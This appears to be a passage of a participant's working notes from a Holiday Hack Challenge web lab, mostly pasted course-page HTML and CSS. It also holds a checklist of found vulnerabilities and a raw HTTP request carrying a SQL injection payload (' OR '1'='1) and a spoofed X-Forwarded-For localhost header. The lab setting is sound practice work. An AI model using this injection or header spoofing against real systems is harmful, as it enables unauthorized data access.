            right: 20px;
        }
    }
    
    @media (max-width: 600px) {
        .back-to-search {
            font-size: 0.75rem;
            padding: 4px 8px;
            bottom: 15px;
            right: 15px;
        }
    }
    
    @media (max-width: 480px) {
        .back-to-search {
            font-size: 0.7rem;
            padding: 4px 8px;
            bottom: 60px;
            right: 10px;
        }
    }
    
    @media (max-width: 320px) {
        .back-to-search {
            font-size: 0.65rem;
            padding: 3px 7px;
            bottom: 70px;
            right: 5px;
        }
    }
    
    /* Cookie showcase styles */
    .cookie-showcase {
        display: flex;
        justify-content: space-around;
        align-items: center;
        margin: 1.5rem 0;
        padding: 1rem;
        background: rgba(255, 255, 255, 0.8);
        border-radius: 8px;
        height: 120px;
    }
    
    .cookie {
        width: 60px;
        height: 60px;
        border-radius: 50%;
        position: relative;
    }
    
    .cookie::before {
        position: absolute;
        width: 6px;
        height: 6px;
        background: #3d2817;
        border-radius: 50%;
        top: 15px;
        left: 20px;
        box-shadow: 
            15px 10px 0 #3d2817,
            -10px 15px 0 #3d2817,
            20px -5px 0 #3d2817,
            -5px -10px 0 #3d2817;
    }
    
    .cookie-frosted {
        width: 60px;
        height: 60px;
        background: #c87f35;
        border-radius: 50%;
        position: relative;
        box-shadow: inset 0 0 10px rgba(0, 0, 0, 0.3);
    }
    
    .cookie-frosted::before {
        content: '';
        position: absolute;
        width: 50px;
        height: 50px;
        background: #f5f5f5;
        border-radius: 50%;
        top: 5px;
        left: 5px;
    }
    
    .cookie-sprinkles {
        width: 60px;
        height: 60px;
        background: #c87f35;
        border-radius: 50%;
        position: relative;
        box-shadow: inset 0 0 10px rgba(0, 0, 0, 0.3);
    }
    
    .cookie-sprinkles::before {
        content: '';
        position: absolute;
        width: 50px;
        height: 50px;
        background: #f5f5f5;
        border-radius: 50%;
        top: 5px;
        left: 5px;
    }
    
    .sprinkle {
        position: absolute;
        width: 5px;
        height: 2px;
        border-radius: 1px;
        z-index: 2;
        top: 50%;
        left: 50%;
    }
    
    .cookie-display-container {
        position: relative;
        width: 100%;
        margin: 1.5rem 0;
    }
    
    .cookie-display {
        display: flex;
        flex-direction: row;
        flex-wrap: nowrap;
        overflow-x: hidden;
        overflow-y: hidden;
        justify-content: flex-start;
        align-items: center;
        gap: 20px;
        padding: 20px 30px;
        background: rgba(255, 255, 255, 0.5);
        border-radius: 8px;
        white-space: nowrap;
        min-height: 100px;
        scroll-behavior: smooth;
        -webkit-overflow-scrolling: touch;
    }
    
    .cookie {
        display: inline-block;
        font-size: 3rem;
        animation: bounce 2s infinite ease-in-out;
        cursor: pointer;
        transition: transform 0.3s ease;
        flex-shrink: 0;
    }
    
    .cookie:hover {
        transform: scale(1.2);
    }
    
    .cookie:nth-child(2n) {
        animation-delay: 0.3s;
    }
    
    .cookie:nth-child(3n) {
        animation-delay: 0.6s;
    }
    
    .cookie:nth-child(4n) {
        animation-delay: 0.9s;
    }
    
    @keyframes bounce {
        0%, 100% {
            transform: translateY(0);
        }
        50% {
            transform: translateY(-10px);
        }
    }
    
    .cookie-scroll-btn {
        position: absolute;
        top: 50%;
        transform: translateY(-50%);
        width: 30px;
        height: 30px;
        background-color: rgba(210, 39, 54, 0.8);
        color: white;
        border: none;
        border-radius: 50%;
        font-size: 1rem;
        display: flex;
        align-items: center;
        justify-content: center;
        cursor: pointer;
        z-index: 10;
        opacity: 0.8;
        transition: all 0.2s ease;
        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
    }
    
    .cookie-scroll-btn:hover {
        opacity: 1;
        transform: translateY(-50%) scale(1.1);
        box-shadow: 0 3px 6px rgba(0, 0, 0, 0.3);
    }
    
    .cookie-scroll-btn:focus {
        outline: none;
        box-shadow: 0 0 0 3px rgba(210, 39, 54, 0.4);
    }
    
    .cookie-scroll-btn.left {
        left: 10px;
    }
    
    .cookie-scroll-btn.right {
        right: 10px;
    }
    
    .cookie-scroll-btn.hidden {
        display: none;
    }
    
    @media (max-width: 768px) {
        .cookie {
            font-size: 2.5rem;
        }
        
        .cookie-display {
            gap: 15px;
            padding: 15px 25px;
        }
        
        .cookie-scroll-btn {
            width: 25px;
            height: 25px;
            font-size: 0.9rem;
        }
    }
    
    @media (max-width: 480px) {
        .cookie {
            font-size: 2rem;
        }
        
        .cookie-display {
            gap: 10px;
            padding: 10px 20px;
        }
        
        .cookie-scroll-btn {
            width: 22px;
            height: 22px;
            font-size: 0.8rem;
        }
    }
    
    @media (max-width: 768px) {
        .cookie-display {
            padding: 15px 0;
            gap: 15px;
        }
        
        .cookie {
            font-size: 2.5rem;
        }
    }
    
    @media (max-width: 480px) {
        .cookie-display {
            padding: 10px 0;
            gap: 10px;
        }
        
        .cookie {
            font-size: 2rem;
        }
    }
    
    .scroll-indicator {
        position: absolute;
        top: 50%;
        transform: translateY(-50%);
        color: var(--accent-color);
        font-size: 1.5rem;
        font-weight: bold;
        opacity: 0.7;
        cursor: pointer;
        z-index: 5;
        padding: 5px;
        background: rgba(255, 255, 255, 0.5);
        border-radius: 50%;
        width: 30px;
        height: 30px;
        display: flex;
        align-items: center;
        justify-content: center;
        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
        transition: opacity 0.3s ease;
    }
    
    .scroll-indicator:hover {
        opacity: 1;
    }
    
    .scroll-indicator.left {
        left: 5px;
    }
    
    .scroll-indicator.right {
        right: 5px;
    }
    
    @media (max-width: 480px) {
        h2.semester-heading,
        .courses-container > h2 {
            font-size: 1.2rem;
        }
    }
    
    .reindeer-gallery {
        margin: 1.5rem 0;
        overflow: auto;
        border-radius: 8px;
        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
    }
    
    .reindeer-profile {
        background: rgba(255, 255, 255, 0.9);
        padding: 0.8rem;
        border-radius: 8px;
        width: calc(33.33% - 10px);
        box-sizing: border-box;
        text-align: center;
        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
    }
    
    .reindeer-profile h3 {
        margin-top: 0;
        margin-bottom: 0.5rem;
        font-size: 1.2rem;
        color: var(--accent-color);
        overflow: hidden;
        text-overflow: ellipsis;
        white-space: nowrap;
    }
    
    .reindeer-profile p {
        margin: 0.3rem 0;
        font-size: 0.9rem;
        overflow: hidden;
        text-overflow: ellipsis;
    }

    .reindeer-table {
        width: 100%;
        border-collapse: collapse;
        background: rgba(255, 255, 255, 0.9);
        border-radius: 8px;
        overflow: hidden;
        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
    }
    
    .reindeer-table th {
        background-color: var(--accent-color);
        color: white;
        padding: 12px 15px;
        text-align: center;
        font-weight: bold;
        font-size: 1rem;
    }
    
    .reindeer-table td {
        padding: 10px 15px;
        border-bottom: 1px solid rgba(0, 0, 0, 0.1);
        font-size: 0.95rem;
    }
    
    .reindeer-table tr:last-child td {
        border-bottom: none;
    }
    
    .reindeer-table tr:nth-child(even) {
        background-color: rgba(235, 235, 235, 0.5);
    }
    
    .reindeer-table .reindeer-name {
        font-weight: bold;
        color: var(--accent-color);
    }
    
    @media (max-width: 768px) {
        .reindeer-table th,
        .reindeer-table td {
            padding: 8px 10px;
            font-size: 0.9rem;
        }
    }
    
    @media (max-width: 480px) {
        .reindeer-table {
            font-size: 0.85rem;
        }
        
        .reindeer-table th,
        .reindeer-table td {
            padding: 6px 8px;
            font-size: 0.8rem;
        }
    }

    @media (max-width: 768px) {
        .reindeer-profile {
            width: calc(50% - 10px);
        }
        
        .reindeer-profile h3 {
            font-size: 1.1rem;
        }
    }
    
    @media (max-width: 480px) {
        .reindeer-profile {
            width: 100%;
        }
        
        .reindeer-profile h3 {
            font-size: 1rem;
        }
        
        .reindeer-gallery {
            gap: 10px;
        }
    }
    
    .reindeer-gallery {
        display: flex;
        flex-wrap: wrap;
        justify-content: center;
        gap: 1rem;
        margin-top: 1.5rem;
        background: rgba(255, 255, 255, 0.8);
        padding: 1rem;
        border-radius: 8px;
    }
    
    .reindeer-profile {
        text-align: center;
        width: 100px;
        padding: 0.5rem;
        background: rgba(255, 255, 255, 0.9);
        border-radius: 8px;
        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
    }
    
    .reindeer-avatar {
        font-size: 2rem;
        margin-bottom: 0.5rem;
    }
    
    .reindeer-name {
        font-weight: bold;
        margin-bottom: 0.3rem;
    }
    
    .reindeer-specialty {
        font-size: 0.8rem;
        color: #666;
    }
    
    .blueprint {
        background: rgba(255, 255, 255, 0.9);
        padding: 1rem;
        border-radius: 8px;
        margin: 1.5rem auto;
        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
        text-align: center;
    }
    
    .blueprint h3 {
        font-size: 1.2rem;
        color: var(--accent-color);
        margin-top: 0;
        margin-bottom: 0.8rem;
        text-align: center;
    }
    
    .ascii-art {
        display: flex;
        justify-content: center;
        align-items: center;
    }
    
    .ascii-art pre {
        display: inline-block;
        margin: 0;
        text-align: left;
        font-family: monospace;
        font-size: 0.75rem;
        line-height: 1.2;
        white-space: pre;
        color: var(--accent-color);
    }
    
    @media (max-width: 768px) {
        .blueprint h3 {
            font-size: 1.1rem;
        }
        
        .ascii-art pre {
            font-size: 0.65rem;
        }
    }
    
    @media (max-width: 600px) {
        .ascii-art pre {
            font-size: 0.55rem;
            line-height: 1;
        }
    }
    
    @media (max-width: 480px) {
        .blueprint {
            padding: 0.8rem;
        }
        
        .blueprint h3 {
            font-size: 1rem;
            margin-bottom: 0.6rem;
        }
        
        .ascii-art pre {
            font-size: 0.45rem;
            line-height: 0.9;
        }
    }
    
    @media (max-width: 320px) {
        .ascii-art pre {
            font-size: 0.4rem;
            transform: scale(0.8);
            transform-origin: center center;
        }
    }
</style>
    <link rel="stylesheet" href="/register/css/notification.css">
</head>
<body>
    <div class="mini-gnome-container"></div>
<script>
(function() {
    if (window.gnomeVandalLoaded) return;
    window.gnomeVandalLoaded = true;
    
    document.addEventListener('DOMContentLoaded', function() {
        function getCookie(name) {
            var value = "; " + document.cookie;
            var parts = value.split("; " + name + "=");
            if (parts.length == 2) return parts.pop().split(";").shift();
        }

        if (getCookie('Schrodinger')) {
            var container = document.querySelector('.mini-gnome-container');
            if (container && !document.getElementById('mini-gnome')) {
                var img = document.createElement('img');
                img.src = '/gnomeU?id=d116a229-4021-45ff-a1bb-c6024a9e5850';
                img.id = 'mini-gnome';
                img.style.cssText = 'width: 20px;height: auto;position: fixed; left: 10px; bottom: 10px;';
                container.appendChild(img);
            }
        }
    });
})();
</script>
    
    <div class="notification">In-scope vulnerability previously found and reported.</div>
    
    <main id="elfStyle" style="padding: 1.5rem; width: 100%;">
        <!-- Include common animations -->
        <div id="snowflakes"></div>

<script src="/register/js/course_common.js"></script>
        
        <header>
            <p class="welcome" role="banner">🎄 Neighborhood College Course Details</p>
        </header>
        
        <section class="courses-content">
            <div class="courses-container">
                <div class="course-banner">
                    <div class="course-icon">🎅</div>
                    <h1 style="font-size: 1.5rem;">HOL 407 - Holiday Behavior Studies (WIP)</h1>
                    <p style="font-size: .85rem;">5 Credits | Prerequisite: HOL 201 - Holiday Traditions</p>
                </div>
                
                <div class="instructor-section">
                    <div class="instructor-avatar">KK</div>
                    <div>
                        <h3>Instructor: Kringle Kris</h3>
                        <p>Chief Holiday Behavioral Specialist, 250 years experience</p>
                    </div>
                </div>
                
                <div class="course-details">
                    <div class="course-section">
                        <h2>❄️ Course Description</h2>
                        <p style="text-indent: 20px; text-align: justify; font-size: .9rem;">An advanced course analyzing the distinctive behaviors and mannerisms essential for the holiday spirit. Students will learn the art of the perfect "Ho Ho Ho," master a jolly laugh, develop skills in joyful gift delivery, and study the ethics of determining who's naughty and nice. This confidential course is essential for anyone wishing to promote the grandest holiday spirit.</p>
                    </div>
                    
                    <div class="course-section">
                        <h2>❄️ Learning Outcomes</h2>
                        <ul>
                            <li>Perfect the authentic belly laugh</li>
                            <li>Master efficient cookie baking and consumption techniques</li>
                            <li>Develop holiday crowd navigation skills</li>
                            <li>Learn the secret traditions of cross-cultural gift giving</li>
                            <li>Understand the impacts of joyful gift delivery</li>
                        </ul>
                    </div>

                    <div class="course-section">
                        <h2>❄️ Weekly Schedule</h2>
                        <ul>
                            <li><strong>Week 1-2:</strong> The History and the Evolution of Gift Giving</li>
                            <li><strong>Week 3-4:</strong> The Art of Ho-Ho-Ho: Voice and Laughter Training</li>
                            <li><strong>Week 5-6:</strong> The Naughty and Nice List: Ethical Considerations</li>
                            <li><strong>Week 7-8:</strong> Time Management for Effective Gift Delivery</li>
                            <li><strong>Week 9-10:</strong> Holiday Cheer and Communication and Management</li>
                            <li><strong>Week 11-12:</strong> Maintaining the Holiday Spirit Year-Round</li>
                        </ul>
                    </div>
                
                    <div class="course-section restricted-content">
                        <h2>❄️ Restricted Resources</h2>
                        <p class="warning-text">⚠️ The following materials are classified and only available to authorized personnel:</p>
                        <ul>
                            <li>"The Holiday Codex: Complete Edition"</li>
                            <li>Original Holiday Recipes from Around the World</li>
                            <li>Sociology of Holiday Crowds</li>
                            <li>Effective Gift Delivery Strategies</li>
                        </ul>
                    </div>
                </div>               
                
            </div>
        </section>
        
        <!-- Common navigation and instructions section -->
<p class="violation"><a href="/">🏠 Return Home</a> | <a href="/register/reset">🔁 Reset Session</a> | <a href="/register/status_report">📋 View Status Report</a> | <a href="#" id="instBtn" aria-expanded="false" aria-controls="rules">📖 Instructions</a></p>
<div id="rules" class="rules" aria-hidden="true">    <img id="instructions" src="/register/images/instructions.png" alt="Instructions for the Registration System" style="max-height:100%;">
    <button id="closeInstructions" class="close-instructions" aria-label="Close Instructions">Close</button>
</div>
    </main>
</body>
</html>
```

### como vamos ahora
### 🔍 Vulnerabilities Found

- ✅ **Uncovered developer information disclosure.**
- ✅ **Exploited Information Disclosure via login**
- ✅ **Found commented-out course search**
- ✅ **Identified SQL injection vulnerability**
- ✅ **Hidden course found via cookie prediction**

Total Found: **5**

### y sigue

```
POST /register/courses/search?id=d116a229-4021-45ff-a1bb-c6024a9e5850 HTTP/2
Host: flask-schrodingers-scope-firestore.holidayhackchallenge.com
Cookie: Schrodinger=a409ddd1-7278-45f2-9a57-df6960515d33; registration=eb72a05369dcb453
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:145.0) Gecko/20100101 Firefox/145.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 64
Origin: https://flask-schrodingers-scope-firestore.holidayhackchallenge.com
Referer: https://flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/courses/search?id=d116a229-4021-45ff-a1bb-c6024a9e5850
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
X-Forwarded-For: 127.0.0.1

courseNumber=' OR '1'='1&id=d116a229-4021-45ff-a1bb-c6024a9e5850
<div class="speech-bubble"> <span class="initial-text">My friends failed to stop CyberNinja from ...</span> <span class="hover-text">... doing the right thing. XSS not expected / intended here.</span> </div>
```


## aplicar sql ii, ir abajo y reportar el curso genomo, es la ultima




## casi pero no

```
https://flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/status_report?id=d116a229-4021-45ff-a1bb-c6024a9e5850
<!DOCTYPE html>
<html lang="en">
<head>
    <!-- Common head elements -->
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="stylesheet" href="/register/css/style.css">
<link rel="icon" href="/register/images/favicon.ico" type="image/x-icon">
<script src="/register/js/home.js" defer></script>
<script src="/register/js/idparam-propagation.js" defer></script>
<style>
    body {
        background: url('/register/images/snowy_background.png') no-repeat center center fixed;
        background-size: cover;
    }
    
    :root {
        --accent-color: #D22736;
        --accent-color-rgb: 210, 39, 54;
        --secondary-color: #4d9e40;
    }
</style>
    <title>Penetration Test Results</title>
    <!-- Common page styles -->
<style>    
    .snowflake {
        position: absolute;
        color: white;
        opacity: 0.7;
        font-size: 1.5rem;
        animation: fall linear infinite;
        z-index: -1;
    }
    
    @keyframes fall {
        0% {
            transform: translateY(-100vh);
        }
        100% {
            transform: translateY(95vh);
        }
    }
      /* Snowflake styles */
    #snowflakes {
        position: fixed;
        width: 100%;
        height: 100%;
        top: 0;
        left: 0;
        pointer-events: none;
        z-index: -1;
        overflow: hidden;
    }
	
	/* Snow particles animation */
    .snow-animation {
        position: relative;
        height: 150px;
        background: linear-gradient(to bottom, #3498db, #2c3e50);
        border-radius: 8px;
        margin-top: 1.5rem;
        overflow: hidden;
    }
    
    .snow-particle {
        position: absolute;
        background: white;
        border-radius: 50%;
        opacity: 0.8;
        animation: snowfall linear infinite;
    }
    
    @keyframes snowfall {
        0% {
            transform: translateY(-10px);
        }
        100% {
            transform: translateY(150px);
        }
    }
</style>
    <!-- Common course page styles -->
<style>
    .course-banner {
        background: linear-gradient(to right, #e74c3c, #c0392b);
        border-radius: 8px;
        color: white;
        text-shadow: 1px 1px 3px rgba(0,0,0,0.5);
    }
    
    .course-icon {
        font-size: 2.5rem;
    }
    
    .course-details {
        display: grid;
        grid-template-columns: 1fr 1fr;
        gap: 1.5rem;
        margin-bottom: 1rem;
    }
    
    .course-section {
        background: rgba(255, 255, 255, 0.9);
        padding: .5rem;
        border-radius: 8px;
        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
    }

    .courses-content {
        width: 100%;
        display: flex;
        justify-content: center;
    }

    .courses-container {
        position: relative;
        background: rgba(255, 255, 255, 0.8);
        padding: 1rem;
        border-radius: 10px;
        width: 90%;
        max-width: 1100px;
        margin: 0 auto;
        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
    }

    .courses-list {
        text-align: left;
        background: transparent;
        padding: 0;
        font-size: clamp(0.9rem, 1.7vw, 1.3rem);
    }

    .courses-list li {
        padding: 0.5rem 0;
        border-bottom: 1px solid rgba(0, 0, 0, 0.1);
        white-space: normal;
        line-height: 1.3;
    }

    .courses-list a {
        display: inline-block;
    }
    
    .course-banner p {
        font-size: clamp(0.9rem, 2vw, 1.2rem);
        background: transparent;
    }

    .course-section h2 {
        font-size: clamp(1.2rem, 2.5vw, 1.8rem);
        margin-bottom: 0.8rem;
    }

    .course-section p, 
    .course-section li {
        font-size: clamp(0.9rem, 2vw, 1.2rem);
        line-height: 1.4;
        margin-bottom: 0.5rem;
        font-size: .9rem;
    }

    .instructor-section {
        display: flex;
        align-items: center;
        gap: 1.5rem;
        background: rgba(255, 255, 255, 0.9);
        border-radius: 8px;
        margin-bottom: 1rem;
        justify-content: center;
    }
    
    .instructor-section h3 {
        font-size: clamp(1.1rem, 2.2vw, 1.5rem);
    }

    .instructor-section p {
        font-size: clamp(0.8rem, 1.8vw, 1.1rem);
        background: transparent;
        margin: 0;
        padding: 0;
    }

    .instructor-avatar {
        background: #2ecc71;
        color: white;
        width: 50px;
        height: 50px;
        border-radius: 50%;
        display: flex;
        align-items: center;
        justify-content: center;
        font-size: 1.5rem;
    }

    h2.semester-heading, 
    .courses-container > h2 {
        white-space: nowrap;
        font-size: 1.5rem;
        margin: 1rem 0;
        text-align: center;
    }
    
    ul {
        background: var(--panel-bg);
        padding: 1rem;
        border-radius: 10px;
        list-style-type: square;
        margin-bottom: 1rem;
        text-align: left;
    }

    .back-to-search {
        position: fixed;
        bottom: 15px;
        right: 15px;
        background-color: rgba(210, 39, 54, 0.85);
        color: white;
        padding: 5px 10px;
        border-radius: 15px;
        font-size: 0.75rem;
        text-decoration: none;
        box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
        z-index: 1000; 
        transition: all 0.3s ease;
        white-space: nowrap;
        max-width: 90px;
        overflow: hidden;
        text-overflow: ellipsis;
        opacity: 0.85;
        transform: translate(0, 0);
    }
    
    .back-to-search:hover {
        background-color: rgba(210, 39, 54, 1);
        opacity: 1;
        transform: translateY(-2px);
        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
    }
    
    .back-to-search::before {
        content: "←";
        margin-right: 3px;
    }
    
    @media (max-width: 768px) {
        .back-to-search {
            bottom: 65px; 
            right: 10px;
            font-size: 0.7rem;
            padding: 4px 8px;
            max-width: 80px;
        }
    }
    
    @media (max-width: 600px) {
        .back-to-search {
            bottom: 70px;
            right: 10px;
            font-size: 0.7rem;
            padding: 3px 7px;
            max-width: 75px;
        }
    }
    
    @media (max-width: 480px) {
        .back-to-search {
            bottom: 80px;
            right: 8px;
            font-size: 0.65rem;
            padding: 3px 6px;
            max-width: 70px;
        }
    }
    
    @media (max-width: 768px) {
        .back-to-search {
            font-size: 0.8rem;
            padding: 5px 10px;
            bottom: 20px;
            right: 20px;
        }
    }
    
    @media (max-width: 600px) {
        .back-to-search {
            font-size: 0.75rem;
            padding: 4px 8px;
            bottom: 15px;
            right: 15px;
        }
    }
    
    @media (max-width: 480px) {
        .back-to-search {
            font-size: 0.7rem;
            padding: 4px 8px;
            bottom: 60px;
            right: 10px;
        }
    }
    
    @media (max-width: 320px) {
        .back-to-search {
            font-size: 0.65rem;
            padding: 3px 7px;
            bottom: 70px;
            right: 5px;
        }
    }
    
    /* Cookie showcase styles */
    .cookie-showcase {
        display: flex;
        justify-content: space-around;
        align-items: center;
        margin: 1.5rem 0;
        padding: 1rem;
        background: rgba(255, 255, 255, 0.8);
        border-radius: 8px;
        height: 120px;
    }
    
    .cookie {
        width: 60px;
        height: 60px;
        border-radius: 50%;
        position: relative;
    }
    
    .cookie::before {
        position: absolute;
        width: 6px;
        height: 6px;
        background: #3d2817;
        border-radius: 50%;
        top: 15px;
        left: 20px;
        box-shadow: 
            15px 10px 0 #3d2817,
            -10px 15px 0 #3d2817,
            20px -5px 0 #3d2817,
            -5px -10px 0 #3d2817;
    }
    
    .cookie-frosted {
        width: 60px;
        height: 60px;
        background: #c87f35;
        border-radius: 50%;
        position: relative;
        box-shadow: inset 0 0 10px rgba(0, 0, 0, 0.3);
    }
    
    .cookie-frosted::before {
        content: '';
        position: absolute;
        width: 50px;
        height: 50px;
        background: #f5f5f5;
        border-radius: 50%;
        top: 5px;
        left: 5px;
    }
    
    .cookie-sprinkles {
        width: 60px;
        height: 60px;
        background: #c87f35;
        border-radius: 50%;
        position: relative;
        box-shadow: inset 0 0 10px rgba(0, 0, 0, 0.3);
    }
    
    .cookie-sprinkles::before {
        content: '';
        position: absolute;
        width: 50px;
        height: 50px;
        background: #f5f5f5;
        border-radius: 50%;
        top: 5px;
        left: 5px;
    }
    
    .sprinkle {
        position: absolute;
        width: 5px;
        height: 2px;
        border-radius: 1px;
        z-index: 2;
        top: 50%;
        left: 50%;
    }
    
    .cookie-display-container {
        position: relative;
        width: 100%;
        margin: 1.5rem 0;
    }
    
    .cookie-display {
        display: flex;
        flex-direction: row;
        flex-wrap: nowrap;
        overflow-x: hidden;
        overflow-y: hidden;
        justify-content: flex-start;
        align-items: center;
        gap: 20px;
        padding: 20px 30px;
        background: rgba(255, 255, 255, 0.5);
        border-radius: 8px;
        white-space: nowrap;
        min-height: 100px;
        scroll-behavior: smooth;
        -webkit-overflow-scrolling: touch;
    }
    
    .cookie {
        display: inline-block;
        font-size: 3rem;
        animation: bounce 2s infinite ease-in-out;
        cursor: pointer;
        transition: transform 0.3s ease;
        flex-shrink: 0;
    }
    
    .cookie:hover {
        transform: scale(1.2);
    }
    
    .cookie:nth-child(2n) {
        animation-delay: 0.3s;
    }
    
    .cookie:nth-child(3n) {
        animation-delay: 0.6s;
    }
    
    .cookie:nth-child(4n) {
        animation-delay: 0.9s;
    }
    
    @keyframes bounce {
        0%, 100% {
            transform: translateY(0);
        }
        50% {
            transform: translateY(-10px);
        }
    }
    
    .cookie-scroll-btn {
        position: absolute;
        top: 50%;
        transform: translateY(-50%);
        width: 30px;
        height: 30px;
        background-color: rgba(210, 39, 54, 0.8);
        color: white;
        border: none;
        border-radius: 50%;
        font-size: 1rem;
        display: flex;
        align-items: center;
        justify-content: center;
        cursor: pointer;
        z-index: 10;
        opacity: 0.8;
        transition: all 0.2s ease;
        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
    }
    
    .cookie-scroll-btn:hover {
        opacity: 1;
        transform: translateY(-50%) scale(1.1);
        box-shadow: 0 3px 6px rgba(0, 0, 0, 0.3);
    }
    
    .cookie-scroll-btn:focus {
        outline: none;
        box-shadow: 0 0 0 3px rgba(210, 39, 54, 0.4);
    }
    
    .cookie-scroll-btn.left {
        left: 10px;
    }
    
    .cookie-scroll-btn.right {
        right: 10px;
    }
    
    .cookie-scroll-btn.hidden {
        display: none;
    }
    
    @media (max-width: 768px) {
        .cookie {
            font-size: 2.5rem;
        }
        
        .cookie-display {
            gap: 15px;
            padding: 15px 25px;
        }
        
        .cookie-scroll-btn {
            width: 25px;
            height: 25px;
            font-size: 0.9rem;
        }
    }
    
    @media (max-width: 480px) {
        .cookie {
            font-size: 2rem;
        }
        
        .cookie-display {
            gap: 10px;
            padding: 10px 20px;
        }
        
        .cookie-scroll-btn {
            width: 22px;
            height: 22px;
            font-size: 0.8rem;
        }
    }
    
    @media (max-width: 768px) {
        .cookie-display {
            padding: 15px 0;
            gap: 15px;
        }
        
        .cookie {
            font-size: 2.5rem;
        }
    }
    
    @media (max-width: 480px) {
        .cookie-display {
            padding: 10px 0;
            gap: 10px;
        }
        
        .cookie {
            font-size: 2rem;
        }
    }
    
    .scroll-indicator {
        position: absolute;
        top: 50%;
        transform: translateY(-50%);
        color: var(--accent-color);
        font-size: 1.5rem;
        font-weight: bold;
        opacity: 0.7;
        cursor: pointer;
        z-index: 5;
        padding: 5px;
        background: rgba(255, 255, 255, 0.5);
        border-radius: 50%;
        width: 30px;
        height: 30px;
        display: flex;
        align-items: center;
        justify-content: center;
        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
        transition: opacity 0.3s ease;
    }
    
    .scroll-indicator:hover {
        opacity: 1;
    }
    
    .scroll-indicator.left {
        left: 5px;
    }
    
    .scroll-indicator.right {
        right: 5px;
    }
    
    @media (max-width: 480px) {
        h2.semester-heading,
        .courses-container > h2 {
            font-size: 1.2rem;
        }
    }
    
    .reindeer-gallery {
        margin: 1.5rem 0;
        overflow: auto;
        border-radius: 8px;
        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
    }
    
    .reindeer-profile {
        background: rgba(255, 255, 255, 0.9);
        padding: 0.8rem;
        border-radius: 8px;
        width: calc(33.33% - 10px);
        box-sizing: border-box;
        text-align: center;
        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
    }
    
    .reindeer-profile h3 {
        margin-top: 0;
        margin-bottom: 0.5rem;
        font-size: 1.2rem;
        color: var(--accent-color);
        overflow: hidden;
        text-overflow: ellipsis;
        white-space: nowrap;
    }
    
    .reindeer-profile p {
        margin: 0.3rem 0;
        font-size: 0.9rem;
        overflow: hidden;
        text-overflow: ellipsis;
    }

    .reindeer-table {
        width: 100%;
        border-collapse: collapse;
        background: rgba(255, 255, 255, 0.9);
        border-radius: 8px;
        overflow: hidden;
        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
    }
    
    .reindeer-table th {
        background-color: var(--accent-color);
        color: white;
        padding: 12px 15px;
        text-align: center;
        font-weight: bold;
        font-size: 1rem;
    }
    
    .reindeer-table td {
        padding: 10px 15px;
        border-bottom: 1px solid rgba(0, 0, 0, 0.1);
        font-size: 0.95rem;
    }
    
    .reindeer-table tr:last-child td {
        border-bottom: none;
    }
    
    .reindeer-table tr:nth-child(even) {
        background-color: rgba(235, 235, 235, 0.5);
    }
    
    .reindeer-table .reindeer-name {
        font-weight: bold;
        color: var(--accent-color);
    }
    
    @media (max-width: 768px) {
        .reindeer-table th,
        .reindeer-table td {
            padding: 8px 10px;
            font-size: 0.9rem;
        }
    }
    
    @media (max-width: 480px) {
        .reindeer-table {
            font-size: 0.85rem;
        }
        
        .reindeer-table th,
        .reindeer-table td {
            padding: 6px 8px;
            font-size: 0.8rem;
        }
    }

    @media (max-width: 768px) {
        .reindeer-profile {
            width: calc(50% - 10px);
        }
        
        .reindeer-profile h3 {
            font-size: 1.1rem;
        }
    }
    
    @media (max-width: 480px) {
        .reindeer-profile {
            width: 100%;
        }
        
        .reindeer-profile h3 {
            font-size: 1rem;
        }
        
        .reindeer-gallery {
            gap: 10px;
        }
    }
    
    .reindeer-gallery {
        display: flex;
        flex-wrap: wrap;
        justify-content: center;
        gap: 1rem;
        margin-top: 1.5rem;
        background: rgba(255, 255, 255, 0.8);
        padding: 1rem;
        border-radius: 8px;
    }
    
    .reindeer-profile {
        text-align: center;
        width: 100px;
        padding: 0.5rem;
        background: rgba(255, 255, 255, 0.9);
        border-radius: 8px;
        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
    }
    
    .reindeer-avatar {
        font-size: 2rem;
        margin-bottom: 0.5rem;
    }
    
    .reindeer-name {
        font-weight: bold;
        margin-bottom: 0.3rem;
    }
    
    .reindeer-specialty {
        font-size: 0.8rem;
        color: #666;
    }
    
    .blueprint {
        background: rgba(255, 255, 255, 0.9);
        padding: 1rem;
        border-radius: 8px;
        margin: 1.5rem auto;
        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
        text-align: center;
    }
    
    .blueprint h3 {
        font-size: 1.2rem;
        color: var(--accent-color);
        margin-top: 0;
        margin-bottom: 0.8rem;
        text-align: center;
    }
    
    .ascii-art {
        display: flex;
        justify-content: center;
        align-items: center;
    }
    
    .ascii-art pre {
        display: inline-block;
        margin: 0;
        text-align: left;
        font-family: monospace;
        font-size: 0.75rem;
        line-height: 1.2;
        white-space: pre;
        color: var(--accent-color);
    }
    
    @media (max-width: 768px) {
        .blueprint h3 {
            font-size: 1.1rem;
        }
        
        .ascii-art pre {
            font-size: 0.65rem;
        }
    }
    
